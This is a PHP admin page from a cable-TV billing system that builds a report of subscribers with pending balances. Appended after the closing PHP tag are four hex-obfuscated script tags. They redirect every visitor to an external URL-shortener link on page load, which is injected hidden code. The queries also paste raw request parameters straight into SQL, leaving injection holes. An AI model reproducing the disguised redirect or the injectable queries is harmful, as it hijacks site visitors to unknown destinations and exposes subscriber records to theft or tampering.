<?php
define("ZW_IN", 'SETUP');
require_once("helper.php");

$msg    =  isset($_GET['msg']) ? $_GET['msg'] : '';
$id     = base64_decode($_GET['id']);
class myCms extends Cms 
{
    function registerAjaxFunctions()
    {
        $this->xajax->registerFunction("get_Listing");
        $this->xajax->registerFunction("update_status");
        $this->xajax->registerFunction("deleteRow");
        $this->xajax->registerFunction("editMode");
        $this->xajax->registerFunction("sorting");
        $this->xajax->registerFunction("sortTitle");
    }
}
$objMisc = new myCms();
$objMisc->initializeAjax(false,true);
$objMisc->dbFunc->parameters ="&sortOrder=".$sortOrder."&sortBy=".$sortBy ;
$objMisc->rec_pp = 20;
$objMisc->dbFunc->ajax_pagin = true;
$and='';
$status='All';
$having='';
$having='HAVING totdebit-(totcredit+totdiscount)>0';
if($_SERVER['REQUEST_METHOD']=='POST' && isset($_REQUEST['submit']) || $_REQUEST['method']=='search'){
    if(!empty($_REQUEST['subscriber_status']) && $_REQUEST['subscriber_status']!=''){
        $andWhere.=" AND S.STATUS='$_REQUEST[subscriber_status]'";
        $paging_params.="&subscriber_status=".$_REQUEST['subscriber_status'];
    }else{
        $andWhere.=" AND S.STATUS!='T'";
        $paging_params.="&subscriber_status=".$_REQUEST['subscriber_status'];
    }
    /*if(!empty($_REQUEST['from_date']) && !empty($_REQUEST['to_date'])){
        $from =$objMisc->changeDateFormat($_REQUEST['from_date']);
        $to   =$objMisc->changeDateFormat($_REQUEST['to_date']);
        $and .=" AND MONTH_DATE BETWEEN '$from' AND '$to'";
        $andWhere.=" AND M.MONTH_DATE BETWEEN '$from' AND '$to'";
        $and1 .=" AND MC.`MONTH_DATE` BETWEEN '$from' AND '$to'";  
        $paging_params.="&from_date=".$_REQUEST['from_date'];
        $paging_params.="&to_date=".$_REQUEST['to_date'];
    }*/
    if(!empty($_REQUEST['employee_id'])){
        $employeePosted  =" AND ADDED_BY='$_REQUEST[employee_id]'";
        $paging_params.="&employee_id=".$_REQUEST['employee_id'];
    }
    $status=$_REQUEST['status'];
    $having='';
    if($status=='All'){
        $having='HAVING totdebit-(totcredit+totdiscount)>0';
    }
    if($status=='PP'){
        $having=' HAVING totcredit+totdiscount>0 AND totdebit>totcredit+totdiscount AND totdebit-totcredit-totdiscount>0';
        
    }
    if($status=='UP'){
        $having=' HAVING totcredit+totdiscount=0';

    }
    $paging_params.="&status=".$status;
    $paging_params.="&method=search";
    $searchArray=$_REQUEST;
    if(!empty($paging_params)){
        $objMisc->paging_params=$paging_params;
    }
    $permissions=$objMisc->GiveValue("USER_ID='$_REQUEST[employee_id]'",'PERMISSIONS','users');
    $permissions=json_decode($permissions);
    //$permissions = $objMisc->array_column($permissions, 'id');
    $permission=array();
    $k=0;
    foreach ($permissions as $value) {
        //print_r($permissions);
        $permission[] = $permissions[$k]->id;
        $k++;
    }
    $permission=implode(",", $permission);
    if(!empty($permission)){
        $and .=" AND UNIT_ID IN ($permission)";
        $andWhere .=" AND M.UNIT_ID IN ($permission)";
    }
    $rowArray=$_REQUEST;
    
    $wherethis = " 1=1 AND M.HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND M.STATUS='A' AND M.AMOUNT_TYPE='D' $andWhere GROUP BY M.SUBSCRIBER_ID $having ORDER BY S.`SERIAL_NO`*1 ASC";

}else{
    $wherethis = " 1=1 AND M.HEADOFFICE_ID='$_SESSION[HEADOFFICE]' AND S.`STATUS`='A' AND M.STATUS='A' AND M.AMOUNT_TYPE='D' $andWhere GROUP BY M.SUBSCRIBER_ID $having ORDER BY S.`SERIAL_NO`*1 ASC";
}
//echo "SELECT (SELECT IFNULL(SUM(AMOUNT),0) FROM monthly_charges WHERE SUBSCRIBER_ID=S.SUBSCRIBER_ID AND AMOUNT_TYPE='D')as totdebit,(SELECT IFNULL(SUM(DISCOUNT),0) FROM monthly_charges WHERE AMOUNT_TYPE='C' AND SUBSCRIBER_ID=S.SUBSCRIBER_ID)as totdiscount,(SELECT IFNULL(SUM(AMOUNT),0) FROM monthly_charges WHERE AMOUNT_TYPE='C' AND SUBSCRIBER_ID=S.SUBSCRIBER_ID)as totcredit,S.* FROM monthly_charges M JOIN `subscribers` S ON S.SUBSCRIBER_ID=M.SUBSCRIBER_ID WHERE $wherethis";exit;
$classRecord = $objMisc->getAllRecordsPagingNew("SELECT (SELECT IFNULL(SUM(AMOUNT),0) FROM monthly_charges WHERE SUBSCRIBER_ID=S.SUBSCRIBER_ID AND AMOUNT_TYPE='D' AND STATUS='A')as totdebit,(SELECT IFNULL(SUM(DISCOUNT),0) FROM monthly_charges WHERE AMOUNT_TYPE='C' AND SUBSCRIBER_ID=S.SUBSCRIBER_ID AND STATUS='A')as totdiscount,(SELECT IFNULL(SUM(AMOUNT),0) FROM monthly_charges WHERE AMOUNT_TYPE='C' AND SUBSCRIBER_ID=S.SUBSCRIBER_ID AND STATUS='A')as totcredit,S.* FROM monthly_charges M JOIN `subscribers` S ON S.SUBSCRIBER_ID=M.SUBSCRIBER_ID WHERE $wherethis");

$i  = 1;
$pagin_recs = "";
$pagin_recs .= '<input type="hidden" value="" id="checkStatus" name="checkStatus"><thead><tr><th width="5%">S.No</th><th width="6%">Customer Code</th><th width="6%">Customer ID</th><th width="12%">Subscriber Name</th><th width="12%">Address</th><th width="7%">Previous Balance</th><th width="7%">Balance</th><th width="10%">Phone No</th><th width="12%">Set Top Boxes</th></tr></thead><tbody>';  
$totRecs=0; 
if(is_array($classRecord[1]) && !empty($classRecord[1])){ 
    $i=1;
    //print_r($classRecord[1]);exit;
    $currentMonth=date('m');
    $currentYear=date('Y');
    //$totBal=0;
    $totSubscribers=0;
    $j=1;
    foreach ($classRecord[1] as $k => $rowRec){    
        $prevDebit=$objMisc->GiveValue(" SUBSCRIBER_ID='$rowRec[subscriber_id]' AND STATUS='A' AND AMOUNT_TYPE='D' AND MONTH(MONTH_DATE)<'$currentMonth' AND YEAR(MONTH_DATE)<'$currentYear'",'SUM(AMOUNT)','monthly_charges');
        $prevCredit=$objMisc->GiveValue(" SUBSCRIBER_ID='$rowRec[subscriber_id]' AND STATUS='A' AND AMOUNT_TYPE='C' AND MONTH(MONTH_DATE)<'$currentMonth' AND YEAR(MONTH_DATE)<'$currentYear'",'SUM(AMOUNT)','monthly_charges');
        $prevDiscount=$objMisc->GiveValue(" SUBSCRIBER_ID='$rowRec[subscriber_id]' AND STATUS='A' AND AMOUNT_TYPE='C' AND MONTH(MONTH_DATE)<'$currentMonth' AND YEAR(MONTH_DATE)<'$currentYear'",'SUM(DISCOUNT)','monthly_charges');
        $prevBal=$prevDebit-$prevCredit-$prevDiscount;
        $allBoxes=$objMisc->getAllRecordsNew("SELECT S.STB_NO FROM subscriptions S JOIN stb_box B ON S.SUBSCRIPTION_ID=B.SUBSCRIPTION_ID WHERE B.SUBSCRIBER_ID='$rowRec[subscriber_id]' AND B.STATUS='A'");
        
        $setTopBox='';
        foreach ($allBoxes as $key => $allBo) {
            $setTopBox=(($setTopBox=='')?$allBo['stb_no']:$setTopBox.','.$allBo['stb_no']);
        }
        if($k%2==0) 
        $pagin_recs .= '<tr class="odd gradeX">';
        else
        $pagin_recs .= '<tr class="even gradeX">';
        
        $pagin_recs .='<td>'.$rowRec['serial_no'].'</td>';
        $pagin_recs .='<td>'.$rowRec['mso_id'].'</td>';
        $pagin_recs .='<td>'.$rowRec['customer_id'].'</td>';
        $pagin_recs .='<td>'.$rowRec['name'].'</td>';
        $pagin_recs .='<td>'.$rowRec['address'].'</td>';
        $pagin_recs .='<td style="text-align:right;">'.(($prevBal=='')?0:$prevBal).'</td>';
        $bal=$rowRec['totdebit']-$rowRec['totcredit']-$rowRec['totdiscount'];
        //echo $rowRec['totdebit'].'-'.$rowRec['totcredit'].'-'.$rowRec['totdiscount'].'<br>';
        $pagin_recs .='<td style="text-align:right;">'.$bal.'</td>';
        $pagin_recs .='<td>'.$rowRec['phone_no'].'</td>';
        $pagin_recs .='<td>'.$setTopBox.'</td>';
        $pagin_recs .= '</tr>';
        $totBal=$totBal+$bal;
        $totSubscribers=$totSubscribers+1;
        $j++;
        $i++;
        
    }
    $pagin_recs  .= '<input type="hidden" value="'.$i.'" name="artCatCount" id="artCatCount">';
    if($classRecord[2]>$objMisc->rec_pp){
        $pagin_recs  .= '<tr><td colspan="6">'.$classRecord[0].'</td></tr>';
    }
    $pagin_recs  .= '</tbody>';
} else {
    $pagin_recs .= '<tr class="odd gradeX"><td colspan="9" align="center">No Record Found</td></tr></tbody>';
}

if(isset($_GET['id']) && !empty($_GET['id'])){
    $pageheading = "Pending Report for Current Month";
}else{
   $pageheading = "Pending Report for Current Month"; 
}
$whereEmp =   " 1 = 1 AND U.HEADOFFICE_ID='$_SESSION[HEADOFFICE]' and E.STATUS = 'A' order by E.NAME ASC";
$employeeArray          =   $objMisc->myFunc->fnWriteOptionListWithJoin($rowArray['employee_id'],"NAME,USER_ID,","SELECT U.`USER_ID`,E.`NAME` FROM `employees` E JOIN `users` U ON E.`EMPLOYEE_ID`=U.`ID` AND U.`USER_TYPE`='E' WHERE $whereEmp",0,0); 

$smartyVars['from_date']            =   ((!empty($rowArray['from_date']))?$rowArray['from_date']:$fromDate);
$smartyVars['to_date']              =   ((!empty($rowArray['to_date']))?$rowArray['to_date']:date('d/m/Y'));
$smartyVars['totSubscribers']       =   $totSubscribers;
$smartyVars['totBal']               =   $totBal;
$smartyVars['employeeArray']        =   $employeeArray;
$smartyVars['errormsg']             =   $errormsg;
$smartyVars['add']                  =   $add;
$smartyVars['group']                =   $id;
$smartyVars['rowRec']               =   $rowArray;
$smartyVars['pageheading']          =   $pageheading;
$smartyVars['classData']            =   $pagin_recs;

$smartyVars['msg']                  =   $msg;
$smartyVars['page']                 =   $_REQUEST['page'];

$objMisc->displayPage("header,pendingreport,footer",$smartyVars);
?>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>